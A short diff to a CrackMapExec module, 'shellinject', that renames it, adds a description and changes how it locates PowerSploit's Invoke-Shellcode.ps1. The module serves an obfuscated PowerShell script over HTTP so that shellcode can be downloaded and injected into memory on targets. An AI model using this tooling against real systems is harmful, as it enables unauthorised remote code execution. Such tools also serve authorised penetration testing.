@@ -1,5 +1,5 @@
 import os
-from cme.helpers import gen_random_string, create_ps_command, obfs_ps_script
+from cme.helpers import gen_random_string, create_ps_command, obfs_ps_script, get_ps_script
 from sys import exit
 
 class CMEModule:
@@ -7,7 +7,9 @@ class CMEModule:
         Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
         Module by @byt3bl33d3r
     '''
-    name = 'ShellInject'
+    name = 'shellinject'
+
+    description = "Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script"
 
     def options(self, context, module_options):
         '''
@@ -56,7 +58,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open('data/PowerSploit/CodeExecution/Invoke-Shellcode.ps1' ,'r') as ps_script:
+            with open(get_ps_script('CodeExecution/Invoke-Shellcode.ps1') ,'r') as ps_script:
                 ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                 request.wfile.write(ps_script)
 
